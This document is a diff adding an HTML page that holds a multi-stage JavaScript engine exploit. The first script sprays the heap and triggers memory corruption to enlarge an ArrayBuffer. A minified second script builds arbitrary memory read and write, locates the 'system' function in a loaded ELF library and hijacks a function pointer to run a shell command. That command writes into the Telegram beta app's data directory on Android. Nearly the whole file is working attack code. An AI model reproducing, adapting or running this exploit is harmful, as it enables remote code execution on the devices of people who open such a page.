@@ -1,0 +1,53 @@
+<!doctype html><body><div id="v">Ok</div><script id="stageA">"use strict";
+function f([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; }
+var SY = new Array(65600);
+for (var i = 0; i < 65600; i++) SY[i] = Symbol();
+/* keep only a window of the last symbols: the atom array stays
+   large and slot 65535 stays live; the other symbol strings are
+   freed to reclaim heap. */
+var KEEP = SY.slice(65600 - 3000); SY = null;
+var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0], RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
+var PB = new Uint8Array(4080);
+var A = new Array(700), UV = new Array(700);
+for (var i = 0; i < 700; i++) { A[i] = new ArrayBuffer(4080); }
+for (var i = 0; i < 700; i++) { UV[i] = new Uint8Array(A[i]); }
+var D = new Array(3000);
+for (var i = 0; i < 3000; i++) D[i] = new ArrayBuffer(64);
+var T = new Array(600);
+for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
+T[600-2] = null;
+var mark = "NOCORR";
+function fill(p, q) {
+  PB.fill(0);
+  for (var o = p; o + 40 <= 4080; o += 40) {
+    for (var k = 0; k < 20; k++) { PB[o + k] = (q ? RJ[k] : RT[k]); PB[o + 20 + k] = (q ? RT[k] : RJ[k]); }
+  }
+  for (var i = 0; i < 700; i++) UV[i].set(PB);
+}
+var hit = 0;
+for (var ph = 0; ph < 20 && !hit; ph += 4) {
+  for (var q = 0; q < 2 && !hit; q++) {
+    fill(ph, q);
+    try { f(); } catch (e) {}
+    for (var i = 0; i < 600; i++) {
+      if (T[i] !== null && T[i].byteLength > 1024) {
+        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength;
+        break;
+      }
+    }
+  }
+}
+var V = null, VAB = null;
+for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
+if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
+globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
+throw new Error("RESULT " + mark);
+</script><script id="stageB">!function(){var r=26681072,f="id>/data/data/org.telegram.messenger.beta/files/n1",n=281474976710656,t="";try{var i=globalThis.V,a=(globalThis.VAB,globalThis.T);if(!i||327744!==i.length)throw"NOV";var e,o,u=function(r){return(i[r]|i[r+1]<<8|i[r+2]<<16|i[r+3]<<24)>>>0},v=function(r){return i[r]|i[r+1]<<8},h=function(r){var f=u(r);return 4294967296*u(r+4)+f},c=function(r){return r%n},l=function(r){return(r=c(r))>65536&&r<n-1&&r%8==0},b=function(r){return(r=c(r))>65536&&r<n-1&&r%4==0},g=function(r,f){i[r]=255&f,i[r+1]=f>>>8&255,i[r+2]=f>>>16&255,i[r+3]=f>>>24&255},s=function(r,f){var n=f%4294967296,t=Math.floor(f/4294967296);g(r,n),g(r+4,t)},A=-1,B=0,S=null,O=0;for(e=0;e+24<327744&&!S;e+=8)if(327744===u(e)&&l(h(e+16))&&0===v(e+8)){var k=h(e+16);for(g(e,74565),o=0;o<a.length;o++)if(a[o]&&74565===a[o].byteLength){S=a[o],A=e,B=k;break}S||g(e,327744)}for(e=0;e+24<327744&&!S&&O<400;e+=8)if(64===u(e)&&4294967295===u(e+4)&&l(h(e+16))&&0===v(e+8)){O++;var N=h(e+16);for(g(e,74565),o=0;o<a.length;o++)if(a[o]&&74565===a[o].byteLength){S=a[o],A=e,B=N;break}S||g(e,64)}if(!S)throw"NOABX";var w,y,L=function(r,f){w=function(r,f){g(A,f),s(A+16,r);var n=new Uint8Array(S);return g(A,74565),s(A+16,B),n}(r,f),y=r},T=function(r){return w[r-y]},d=function(r){var f=r-y;return w[f]|w[f+1]<<8},m=function(r){var f=r-y;return(w[f]|w[f+1]<<8|w[f+2]<<16|w[f+3]<<24)>>>0},D=function(r){var f=r-y,n=(w[f]|w[f+1]<<8|w[f+2]<<16|w[f+3]<<24)>>>0;return 4294967296*((w[f+4]|w[f+5]<<8|w[f+6]<<16|w[f+7]<<24)>>>0)+n},H=function(r,f){var n=r-y;w[n]=255&f,w[n+1]=f>>>8&255,w[n+2]=f>>>16&255,w[n+3]=f>>>24&255},C=function(r,f){var n=f%4294967296,t=Math.floor(f/4294967296);H(r,n),H(r+4,t)},E=function(r){L(r-256,512)};L(B-8192,16384);var V=d(B-8),M=T(B-6),R=[16,24,32,40,48,56,64,72,80,88,96,104,112,120,128,144,160,176,192,208,224,240,256,288,320,352,384,416,448,480,512][M],Y=0,p="",F=0,G=0,x=[];if(R)F=D(B-8-V*R-48+32),l(F)?(L(F-256,512),G=D(F+16),l(G)&&c(G)%4096==0?(Y=1,G=c(G),x=[G]):p="NOBASE H="+V+" D="+M+" BS="+R+" SLAB="+F+" SBASE="+G):p="NOSLAB H="+V+" D="+M+" BS="+R+" SLAB="+F;else p="BADBS H="+V+" D="+M+" BS="+R;globalThis.SLABV=p;var K=function(r,f,n){var t,i,a,e=r;for(t=0;t<256&&(E(e),i=D(e+f),l(i)&&i!==r);t++){if(E(i),a=D(i+16),l(a)&&c(a)%4096==0){a=c(a);var o,u=0;for(o=0;o<n.length;o++)if(n[o]===a){u=1;break}u||n.push(a)}e=i}};Y&&(K(F,8,x),K(F,0,x));var P=function(r){if((r=c(r))<65536)return!1;if(!Y)return l(r);for(var f=0;f<x.length;f++){var n=x[f];if(r>=n&&r<n+65536)return!0}return!1},U=[],X=function(r){E(r);var f,n,t,i,a=D(r+16),e=d(r+24);if(l(a)&&c(a)%4096==0)for(a=c(a),L(a,65536),f=0;f<16;f++)if(e&1<<f){var o=a+4096*f;if(12===T(o+40))for(i=4048/112,t=0;t<i;t++)d((n=o+48+8+112*t)-8)===t&&20===d(n+18)&&U.length<4096&&U.push(n)}};if(Y){X(F);var j,q=F,z=0;for(z=0;z<256&&(E(q),j=D(q+8),l(j)&&j!==F);z++)X(j),q=j;for(q=F,z=0;z<256&&(E(q),j=D(q),l(j)&&j!==F);z++)X(j),q=j}var I=[8388608,6291456,4194304],J=function(r){E(r);var f=D(r+24);if(!l(f)||!P(f))return 0;E(f);var n=D(f+48);if(!l(n)||!P(n))return 0;E(n);var t=D(n+32);if(!l(t)||!P(t))return 0;E(t);var i,a,e=0;for(i=0;i<32;i++)if(a=D(t+16*i),0x10000000000000000===D(t+16*i+8)&&l(a)&&P(a)){if(E(a),12===d(a+18)){e=a;break}E(t)}if(!e)return 0;E(e);var o=D(e+56);if(!b(o))return 0;var u=D(e+48);if(!l(u))return 0;L(u-256,512);var v=D(u+16);if(!function(r){if(!l(r))return!1;L(r-256,512);var f=D(r+56);return f===I[0]||f===I[1]||f===I[2]}(v))return 0;L(v-256,512);var h=D(v+16);if(!b(h))return 0;var g=c(h)-24425068;return g<65536||g%4096!=0?0:[u,v,h,g]},Q=0;for(o=0;o<U.length&&!Q;o++)Q=J(U[o]);for(e=0;e+48<327744&&!Q;e+=8){if(20===v(e+18))Q=J(B+e)}if(!Q)throw"NOANCHOR";var W=Q[1],Z=(Q[2],Q[3]);L(Z+r-256,512);var $=D(Z+r);if(!b($))throw"NOGOT";var _=function(r,f){if(T(r)!==f.charCodeAt(0))return!1;for(var n=1;n<f.length;n++)if(T(r+n)!==f.charCodeAt(n))return!1;return 0===T(r+f.length)},rr=c($),fr=rr-rr%4096,nr=0;for(o=0;o<8192;o++){var tr=fr-4096*o;if(tr<65536)break;if(E(tr),1179403647===m(tr)){nr=tr;break}}if(!nr)throw"NOELF";L(nr,4194304);var ir=D(nr+32),ar=d(nr+54),er=d(nr+56);if(56!==ar||er<1||er>64)throw"BADPH";var or=0;for(o=0;o<er;o++){var ur=nr+ir+o*ar;if(2===m(ur)){or=nr+D(ur+16);break}}if(!or)throw"NODYN";L(or-256,4608);var vr=0,hr=0,cr=0,lr=0,br=0;for(o=0;o<512;o++){var gr=or+16*o,sr=D(gr),Ar=D(gr+8);if(0===sr)break;var Br=Ar>16777216?Ar:nr+Ar;5===sr?vr=Br:6===sr?hr=Br:10===sr?cr=Ar:4===sr?lr=Br:1879047925===sr&&(br=Br)}if(!hr||!vr||!cr)throw"NOSYM";L(nr,4194304);var Sr,Or,kr=0;if(lr){var Nr=m(lr+4)>>>0;if(Nr>0&&Nr<2e5)for(o=1;o<Nr;o++)if(!(0===(Sr=m(Or=hr+24*o)>>>0)||Sr>=cr)&&_(vr+Sr,"system")){kr=nr+D(Or+8);break}}if(!kr&&br){var wr=m(br)>>>0,yr=m(br+4)>>>0,Lr=m(br+8)>>>0;m(br+12);if(wr&&Lr&&Lr<=4096){var Tr=br+16+8*Lr,dr=Tr+4*wr,mr=function(r){for(var f=5381,n=0;n<r.length;n++)f=33*f+r.charCodeAt(n)>>>0;return f>>>0}("system"),Dr=m(Tr+mr%wr*4)>>>0;if(Dr>=yr)for(o=0;o<2e4;o++){var Hr=m(dr+4*(Dr-yr))>>>0;if((1|Hr)>>>0==(1|mr)>>>0&&(Sr=m(Or=hr+24*Dr)>>>0)&&Sr<cr&&_(vr+Sr,"system")){kr=nr+D(Or+8);break}if(1&Hr)break;Dr++}}}if(!kr)for(o=1;o<1e5;o++)if(!(0===(Sr=m(Or=hr+24*o)>>>0)||Sr>=cr)&&_(vr+Sr,"system")){kr=nr+D(Or+8);break}if(!kr)throw"NOSYS";for(L(B-256,512),o=0;o<50;o++)T(B+o);for(o=0;o<50;o++){w[B+o-y]=255&f.charCodeAt(o)}w[B+50-y]=0,L(W-256,512),C(W+64,B),C(W+16,kr),t="OK"}catch(r){t="ERR "+r}globalThis.MEGA="HF "+t,p&&(globalThis.SLABV=p)}();</script><script id="stageC">if (0) { try {
+var m=(typeof mark!=="undefined")?mark:"-";
+var e=(typeof MEGA!=="undefined")?MEGA:"-";
+var v=(typeof SLABV!=="undefined")?SLABV:"-";
+var x="S1 "+m+" END="+e+" SV="+v;
+try { var D=document.getElementById("v"); if (D) D.textContent=x; } catch(e) {}
+try { console.log(x); } catch(e) {}
+} catch(e) {} }
+/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/</script>
